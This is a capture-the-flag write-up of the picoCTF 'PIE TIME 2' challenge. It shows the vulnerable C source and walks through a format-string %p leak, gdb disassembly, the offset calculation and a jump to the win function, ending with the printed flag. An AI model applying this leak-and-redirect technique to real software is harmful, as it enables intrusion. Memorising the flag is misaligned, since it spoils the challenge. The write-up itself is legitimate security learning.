# PIE TIME 2

## Description

Can you try to get the flag? I'm not revealing anything anymore!!
Additional details will be available after launching your challenge instance.

So, here we given two things.
The program's source code can be downloaded [here](https://challenge-files.picoctf.net/c_rescued_float/0ee50c4c94b334e2007d91218ac385470257261765b09a6620226865a05bf468/vuln.c). The binary can be downloaded [here](https://challenge-files.picoctf.net/c_rescued_float/0ee50c4c94b334e2007d91218ac385470257261765b09a6620226865a05bf468/vuln).

The source code is

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```


We are trying to locate the memory address of the win function. Because it opens up the flag.txt. This is the file where the file is stored.
However, as the memory address is randomised after every execution, we need a memory leak to figure out the general area it is being stored in the memory.
To get an idea of where it is stored in the memory, we can use this format string string vulnerability.

The printf function in the code does not have format string specified. There if we enter format string like %p, instead of printing the exact string, it will actually print out the return address as %p is a pointer that stores the memory addresses.

```
└─$ nc rescued-float.picoctf.net 51826
Enter your name:Hacker
Hacker
 enter the address to jump to, ex => 0x12345: zzz
Segfault Occurred, incorrect address.
```
But when we enter the %p

```
└─$  nc rescued-float.picoctf.net 51826
Enter your name:%p
0xa70
 enter the address to jump to, ex => 0x12345: zzz
Segfault Occurred, incorrect address.
```
It will give the memory address.

So, as this vulnerability leaks the address for this current execution.
We can now use gdb and use their disassemble function to help us visualise the memory address of specific functions and compare them to the once that are leaked.
**This is because the offset between the functions always remains the same.**

```
nc rescued-float.picoctf.net 51826
Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x592f191282a1 (nil) 0x592f191282dc 0x7fffb3e74c20 0x7c 0x7fffb3e8b228 0x7d8872c956a0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x7f000a702520 0x592f091b41c0 0x621bc74da6e0dc00 0x7fffb3e74c80 0x592f091b4441 (nil)
```
We start with comparing the leaked addresses with the win function. But there is no matches with 0x592f091b4441

```
gef➤  disassemble win
Dump of assembler code for function win:
   0x000055555555536a <+0>:     endbr64
   0x000055555555536e <+4>:     push   rbp
   0x000055555555536f <+5>:     mov    rbp,rsp
   0x0000555555555372 <+8>:     sub    rsp,0x10
   0x0000555555555376 <+12>:    lea    rdi,[rip+0xcf6]        # 0x555555556073
   0x000055555555537d <+19>:    call   0x555555555110 <puts@plt>
   0x0000555555555382 <+24>:    lea    rsi,[rip+0xcf3]        # 0x55555555607c
   0x0000555555555389 <+31>:    lea    rdi,[rip+0xcee]        # 0x55555555607e
   0x0000555555555390 <+38>:    call   0x555555555190 <fopen@plt>
   0x0000555555555395 <+43>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000555555555399 <+47>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x000055555555539e <+52>:    jne    0x5555555553b6 <win+76>
   0x00005555555553a0 <+54>:    lea    rdi,[rip+0xce0]        # 0x555555556087
   0x00005555555553a7 <+61>:    call   0x555555555110 <puts@plt>
   0x00005555555553ac <+66>:    mov    edi,0x0
   0x00005555555553b1 <+71>:    call   0x5555555551b0 <exit@plt>
   0x00005555555553b6 <+76>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00005555555553ba <+80>:    mov    rdi,rax
   0x00005555555553bd <+83>:    call   0x555555555150 <fgetc@plt>
   0x00005555555553c2 <+88>:    mov    BYTE PTR [rbp-0x9],al
   0x00005555555553c5 <+91>:    jmp    0x5555555553e1 <win+119>
   0x00005555555553c7 <+93>:    movsx  eax,BYTE PTR [rbp-0x9]
   0x00005555555553cb <+97>:    mov    edi,eax
   0x00005555555553cd <+99>:    call   0x555555555100 <putchar@plt>
   0x00005555555553d2 <+104>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00005555555553d6 <+108>:   mov    rdi,rax
   0x00005555555553d9 <+111>:   call   0x555555555150 <fgetc@plt>
   0x00005555555553de <+116>:   mov    BYTE PTR [rbp-0x9],al
   0x00005555555553e1 <+119>:   cmp    BYTE PTR [rbp-0x9],0xff
   0x00005555555553e5 <+123>:   jne    0x5555555553c7 <win+93>
   0x00005555555553e7 <+125>:   mov    edi,0xa
   0x00005555555553ec <+130>:   call   0x555555555100 <putchar@plt>
   0x00005555555553f1 <+135>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00005555555553f5 <+139>:   mov    rdi,rax
   0x00005555555553f8 <+142>:   call   0x555555555120 <fclose@plt>
   0x00005555555553fd <+147>:   nop
   0x00005555555553fe <+148>:   leave
   0x00005555555553ff <+149>:   ret
End of assembler dump.
gef➤  

```
we tried for main function and the last third is a identical match. This means the third last part of the main function always point out to leak address.
```
gef➤  disassemble main
Dump of assembler code for function main:
   0x0000555555555400 <+0>:     endbr64
   0x0000555555555404 <+4>:     push   rbp
   0x0000555555555405 <+5>:     mov    rbp,rsp
   0x0000555555555408 <+8>:     lea    rsi,[rip+0xfffffffffffffe9a]        # 0x5555555552a9 <segfault_handler>
   0x000055555555540f <+15>:    mov    edi,0xb
   0x0000555555555414 <+20>:    call   0x555555555170 <signal@plt>
   0x0000555555555419 <+25>:    mov    rax,QWORD PTR [rip+0x2bf0]        # 0x555555558010 <stdout@@GLIBC_2.2.5>
   0x0000555555555420 <+32>:    mov    ecx,0x0
   0x0000555555555425 <+37>:    mov    edx,0x2
   0x000055555555542a <+42>:    mov    esi,0x0
   0x000055555555542f <+47>:    mov    rdi,rax
   0x0000555555555432 <+50>:    call   0x555555555180 <setvbuf@plt>
   0x0000555555555437 <+55>:    mov    eax,0x0
   0x000055555555543c <+60>:    call   0x5555555552c7 <call_functions>
   0x0000555555555441 <+65>:    mov    eax,0x0
   0x0000555555555446 <+70>:    pop    rbp
   0x0000555555555447 <+71>:    ret
End of assembler dump.
```

Now we will use a hex calculator to find the offset between the main function address and the win function that allow us to know how far the win function address to the leaked address from the main address.

Win function address - 0x000055555555536a
Leaked address - 0x0000555555555441

Offset = 0x0000555555555441 - 0x000055555555536a = 0xD7

Now we run the command 

```
─$ nc rescued-float.picoctf.net 51826
Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x6454433372a1 (nil) 0x6454433372dc 0x7fffb8d030d0 0x7c 0x7fffb8da4228 0x7bea247406a0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x7f000a702520 0x6454200751c0 0x8ff5c23eb86b9300 0x7fffb8d03130 0x645420075441 (nil)
 enter the address to jump to, ex => 0x12345: 0x64542007536A
You won!
picoCTF{p13_5h0u1dn'7_134k_1ef23143}

```
And it will ask the name we will enter
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

And we get the leak address 0x645420075441
So, 0x645420075441 - 0xD7 = 0x64542007536A
Then we will subtract the offset from it and get the memory address to jump. 

### Flag - picoCTF{p13_5h0u1dn'7_134k_1ef23143}







